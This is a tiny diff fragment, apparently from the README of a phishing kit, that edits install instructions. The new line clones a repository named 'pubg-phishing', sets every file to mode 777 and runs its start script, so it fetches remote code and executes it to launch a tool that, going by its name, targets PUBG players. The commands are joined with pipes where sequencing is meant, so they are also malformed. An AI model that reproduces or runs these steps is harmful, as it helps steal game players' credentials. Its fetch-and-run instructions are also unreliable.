@@ -9,4 +9,4 @@ apt install cat  |
 
 
 
-https://github.com/enes366/pubg-phishing.git  |  chmod 777 * | bash start.sh  
+git clone https://github.com/enes366/pubg-phishing.git  | cd pubg-phishing | chmod 777 * | bash start.sh  
